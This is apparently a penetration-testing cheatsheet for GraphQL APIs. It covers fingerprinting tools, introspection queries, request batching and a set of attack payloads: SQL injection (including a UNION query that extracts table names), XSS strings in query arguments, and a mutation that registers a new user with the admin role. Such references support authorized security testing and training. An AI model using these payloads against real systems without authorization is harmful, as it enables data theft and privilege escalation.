# GraphQL Commands Cheatsheet

## Enumeration Tools

### graphw00f - GraphQL Engine Fingerprinting
```bash
python3 main.py -d -f -t http://TARGET_URL
```
- `-d` : detect mode
- `-f` : fingerprint mode
- `-t` : target URL

### GraphQL-Cop - Security Audit Tool
```bash
# Check version
python3 graphql-cop.py -v

# Run security audit
python3 graphql-cop.py -t http://TARGET_URL/graphql
```

## Introspection Queries

### Get All Types
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

### Get Fields of a Specific Type
```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

### Get All Supported Queries
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

### Get All Mutations
```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### Get Input Fields for Mutation
```graphql
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

## Basic Queries

### Query with Arguments
```graphql
{
  users(username: "admin") {
    id
    username
    role
  }
}
```

### Sub-querying (Nested Objects)
```graphql
{
  posts {
    title
    author {
      username
      role
    }
  }
}
```

## SQL Injection Payloads

### Basic SQL Injection Test
```graphql
{
  user(username: "admin --") {
    uuid
    username
    role
  }
}
```

### Single Quote Test (Error-based)
```graphql
{
  user(username: "admin'") {
    uuid
    username
    role
  }
}
```

### UNION-based SQL Injection (Extract Table Names)
```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

## XSS Payloads

### XSS in Query Argument
```graphql
{
  user(username: "<script>alert(1)</script>") {
    uuid
    username
    role
  }
}
```

### XSS in Invalid Integer Argument
```graphql
{
  post(id: "<script>alert(1)</script>") {
    id
    title
  }
}
```

## Mutations

### Register New User
```graphql
mutation {
  registerUser(input: {username: "newuser", password: "MD5_HASH", role: "user", msg: "message"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

### Privilege Escalation via Mutation
```graphql
mutation {
  registerUser(input: {username: "adminuser", password: "MD5_HASH", role: "admin", msg: "Hacked!"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

## Batching Queries

### Multiple Queries in Single Request
```http
POST /graphql HTTP/1.1
Host: TARGET
Content-Type: application/json

[
  {
    "query": "{user(username: \"admin\") {uuid}}"
  },
  {
    "query": "{post(id: 1) {title}}"
  }
]
```

## Utility Commands

### Generate MD5 Hash for Password
```bash
echo -n 'password' | md5sum
```

## Burp Suite Extensions

### InQL Actions
- Right-click GraphQL request → Extensions → InQL - GraphQL Scanner → Generate queries with InQL Scanner
- View generated queries and mutations in InQL tab

## Common Endpoints
- `/graphql`
- `/api/graphql`
- `/graphiql` (GraphQL IDE interface)
